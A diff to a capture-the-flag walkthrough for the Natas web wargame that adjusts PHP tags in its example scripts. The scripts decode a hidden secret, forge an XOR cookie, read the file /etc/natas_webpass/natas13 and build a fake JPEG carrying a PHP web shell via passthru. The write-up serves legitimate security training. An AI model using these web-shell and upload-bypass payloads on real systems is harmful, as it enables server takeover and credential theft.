@@ -116,7 +116,9 @@ so we must do a bit of reverse of that function.
 
 Here's the simple script that i've used:
 ```php
-base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
+<?php
+print base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
+?>
 ```
 This should give you `oubWYf2kBq` as output, so feed it to the textbox and
 you're good.
@@ -204,9 +206,7 @@ qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
 Now that we have the key, we can create our custom cookie in the way that it
 will show us the password, and I've done it with this script:
 ```
-#!/usr/bin/php
-
-<?
+<?php
     function xor_encrypt($in)
     {
         $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
@@ -247,9 +247,7 @@ with the .jpg format.
 So we first have to craft out file, like this:
 
 ```PHP
-#!/usr/bin/php
-
-<? readfile('/etc/natas_webpass/natas13'); ?>
+<?php readfile('/etc/natas_webpass/natas13'); ?>
 ```
 Here is where BurpSuite come in our help (I won't explain how to use it, but is
 preatty simple and you can learn this thing with a 10 minutes on google)
@@ -271,6 +269,8 @@ of the file.
 
 We'll use this python line of code to add what we need:
 ```python
+#!/usr/bin/env python
+
 fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
 ```
 Now we upload the file and intercept the request with BurpSuite like the
